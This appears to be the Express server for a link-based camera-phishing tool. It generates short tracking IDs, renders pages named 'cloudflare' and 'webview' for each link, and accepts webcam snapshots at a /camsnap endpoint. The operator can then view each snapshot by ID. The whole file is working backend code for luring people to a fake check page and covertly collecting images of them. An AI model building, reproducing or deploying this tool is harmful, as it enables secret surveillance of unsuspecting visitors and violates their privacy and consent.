require('dotenv').config();
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { sequelize, URL } = require('./config/database');

const app = express();
app.use(bodyParser.json({ limit: '20mb', type: 'application/json' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb', type: 'application/x-www-form-urlencoded' }));
app.use(cors());
app.set('view engine', 'ejs');

const PORT = process.env.PORT || 5000;
const hostURL = process.env.HOST_URL || 'http://localhost';

app.get('/c/:path', async (req, res) => {
  try {
    const entry = await URL.findOne({ where: { uniqueId: req.params.path } });
    if (entry) {
      res.render('cloudflare', { url: entry.redirectUrl, uid: req.params.path });
    } else {
      res.redirect('https://your-redirect-url.com');
    }
  } catch (error) {
    res.status(500).send(error.message);
  }
});

app.get('/w/:path', async (req, res) => {
  try {
    const entry = await URL.findOne({ where: { uniqueId: req.params.path } });
    if (entry) {
      res.render('webview', { url: entry.redirectUrl, uid: req.params.path });
    } else {
      res.redirect('https://your-redirect-url.com');
    }
  } catch (error) {
    res.status(500).send(error.message);
  }
});

app.post('/generate', async (req, res) => {
  const { originalUrl, redirectUrl } = req.body;
  const uniqueId = Math.random().toString(36).substring(2, 8);

  try {
    const newURL = await URL.create({
      originalUrl,
      uniqueId,
      redirectUrl,
    });

    res.json({
      originalUrl: newURL.originalUrl,
      uniqueId: newURL.uniqueId,
      redirectUrl: newURL.redirectUrl,
    });
  } catch (error) {
    res.status(500).send(error.message);
  }
});

app.post('/camsnap', async (req, res) => {
  const { uid, img } = req.body;

  try {
    const entry = await URL.findOne({ where: { uniqueId: uid } });
    if (entry) {
      entry.imageData = img;
      await entry.save();
      res.send('Done');
    } else {
      res.status(404).send('Not found');
    }
  } catch (error) {
    res.status(500).send(error.message);
  }
});

app.get('/view/:uid', async (req, res) => {
  try {
    const entry = await URL.findOne({ where: { uniqueId: req.params.uid } });
    if (entry) {
      res.send(`<img src="data:image/png;base64,${entry.imageData}" />`);
    } else {
      res.status(404).send('Not found');
    }
  } catch (error) {
    res.status(500).send(error.message);
  }
});

app.listen(PORT, () => {
  console.log(`App Running on Port ${PORT}!`);
});
